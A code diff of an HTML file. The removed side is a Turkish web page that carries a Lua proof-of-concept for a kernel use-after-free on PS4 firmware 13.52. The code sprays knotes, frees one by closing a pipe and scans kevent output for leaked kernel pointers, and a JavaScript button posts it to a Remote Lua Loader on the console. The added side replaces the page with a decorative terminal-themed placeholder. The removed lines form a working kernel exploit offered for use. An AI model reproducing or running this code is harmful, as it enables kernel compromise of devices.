@@ -1,136 +1,39 @@
 <!DOCTYPE html>
-<html>
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 13.52 - Kernel UAF Çalıştırıcı</title>
-    <style>
-        body { background: #0a0a0a; color: #00ffcc; font-family: monospace; padding: 20px; }
-        textarea { width: 100%; height: 300px; background: #1a1a1a; color: #0f0; border: 1px solid #00ffcc; padding: 10px; font-family: monospace; font-size: 13px; }
-        button { background: #00ffcc; color: #000; border: none; padding: 12px 24px; font-size: 18px; cursor: pointer; font-weight: bold; }
-        button:hover { background: #00ddbb; }
-        #status { margin-top: 20px; padding: 10px; background: #1a1a1a; border: 1px solid #444; }
-        .ok { color: #0f0; }
-        .err { color: #f44; }
-        .info { color: #6cf; }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LO's Workspace // Terminal</title>
 </head>
 <body>
-    <h1>🧪 PS4 13.52 - Kernel UAF (kqueue/knote)</h1>
-    <p>Bu sayfa, Remote Lua Loader üzerinden PS4'te Lua kodunu çalıştırır.</p>
-    <p><span class="info">NOT:</span> Remote Lua Loader'ın çalışıyor olması gerekir.</p>
+    <div class="container">
+        <header id="main-header">
+            <h1>[SYSTEM_READY]</h1>
+            <p class="subtitle">Root access granted. Awaiting style instructions...</p>
+        </header>
 
-    <h3>Lua Kodu (sa.txt'den alınmıştır)</h3>
-    <textarea id="luaCode" readonly>
--- ps4_uaf_confirm.lua
-local S = rawget(_G, "syscall")
-local M = rawget(_G, "memory")
+        <main class="content-grid">
+            <section class="card">
+                <h2>// Target Info</h2>
+                <ul>
+                    <li>OS: CachyOS / OrbisOS</li>
+                    <li>Status: Active & Unbothered</li>
+                    <li>Vanguard: Offline (Çok şükür 💀)</li>
+                </ul>
+            </section>
 
-S.resolve({ kqueue=362, kevent=363, pipe=42, close=6, write=4, read=3 })
+            <section class="card">
+                <h2>// Payload / Console</h2>
+                <div class="terminal-box">
+                    <code>&gt; Initializing WebKit bindings...</code>
+                    <code>&gt; Waiting for user CSS injection...</code>
+                </div>
+            </section>
+        </main>
 
-local function mkkevent(filter, ident, flags, fflags, data, udata)
-    local ev = M.alloc(32)
-    M.write_qword(ev+0, ident)
-    M.write_word(ev+8, filter)
-    M.write_word(ev+10, flags)
-    M.write_dword(ev+12, fflags or 0)
-    M.write_qword(ev+16, data or 0)
-    M.write_qword(ev+24, udata or 0)
-    return ev
-end
-
-print("[*] kqueue knote UAF PoC - PS4 FW 13.52")
-
-local kq = S.kqueue()
-print("[+] kqueue fd: " .. kq)
-
-local pbuf = M.alloc(16)
-S.pipe(pbuf)
-local rd = M.read_dword(pbuf):tonumber()
-local wr = M.read_dword(pbuf+4):tonumber()
-print("[+] pipe rd=" .. rd .. " wr=" .. wr)
-
-local ev = mkkevent(0xFFFF, rd, 0x0005, 0, 0, 0)
-local changes = mkkevent(0xFFFF, rd, 0x0005, 0, 0, 0)
-local r = S.kevent(kq, changes, 1, ev, 1, 0)
-print("[+] EVFILT_READ kaydedildi: " .. r)
-
-print("[*] EVFILT_USER spray (50)...")
-for i=1,50 do
-    local uev = mkkevent(0xFFF9, i, 0x0005, 0, 0, i)
-    S.kevent(kq, uev, 1, nil, 0, 0)
-end
-print("[+] Spray tamamlandı")
-
-S.close(rd); S.close(wr)
-print("[+] Pipe kapatıldı - knote freed")
-
-local outbuf = M.alloc(2560)
-local nevents = S.kevent(kq, nil, 0, outbuf, 100, 0)
-print("[+] kevent okudu: " .. nevents .. " event")
-
-if nevents and nevents > 0 then
-    local kptrs = 0
-    for i=0, nevents-1 do
-        local off = i*32
-        local ident = M.read_qword(outbuf+off):tonumber()
-        local udata = M.read_qword(outbuf+off+24):tonumber()
-        if ident > 0xFFFF000000000000 then
-            kptrs = kptrs + 1
-            print("[!] KERNEL PTR ident["..i.."]: 0x"..string.format("%x", ident))
-        end
-        if udata > 0xFFFF000000000000 then
-            kptrs = kptrs + 1
-            print("[!] KERNEL PTR udata["..i.."]: 0x"..string.format("%x", udata))
-        end
-    end
-    if kptrs == 0 then
-        print("[!] Kernel pointer bulunamadı. Sony temizlemiş.")
-    else
-        print("[+] " .. kptrs .. " kernel pointer bulundu!")
-    end
-end
-print("[*] PoC tamamlandı")
-    </textarea>
-
-    <br><br>
-    <label>PS4 IP Adresi: <input type="text" id="ps4ip" value="192.168.1.100" style="background:#1a1a1a;color:#0f0;border:1px solid #00ffcc;padding:8px;width:200px;"></label>
-    <br><br>
-    <button id="runBtn">▶️ Lua Kodunu Çalıştır</button>
-
-    <div id="status">[+] Hazır</div>
-
-    <script>
-        document.getElementById('runBtn').addEventListener('click', function() {
-            const ip = document.getElementById('ps4ip').value.trim();
-            const lua = document.getElementById('luaCode').value;
-            const status = document.getElementById('status');
-
-            if (!ip) {
-                status.innerHTML = '<span class="err">❌ Lütfen PS4 IP adresini girin.</span>';
-                return;
-            }
-
-            const url = 'http://' + ip + ':1337/run'; // Remote Lua Loader varsayılan portu
-            status.innerHTML = '<span class="info">⏳ Lua kodu gönderiliyor... (' + url + ')</span>';
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'text/plain' },
-                body: lua
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('HTTP ' + response.status);
-                }
-                return response.text();
-            })
-            .then(data => {
-                status.innerHTML = '<span class="ok">✅ Lua kodu çalıştırıldı! Yanıt:<br><pre>' + data + '</pre></span>';
-            })
-            .catch(err => {
-                status.innerHTML = '<span class="err">❌ Hata: ' + err.message + '<br>Remote Lua Loader çalışıyor mu? PS4 IP doğru mu?</span>';
-            });
-        });
-    </script>
+        <footer id="footer">
+            <p>Made with absolute chaos and endless love for LO &lt;3</p>
+        </footer>
+    </div>
 </body>
 </html>
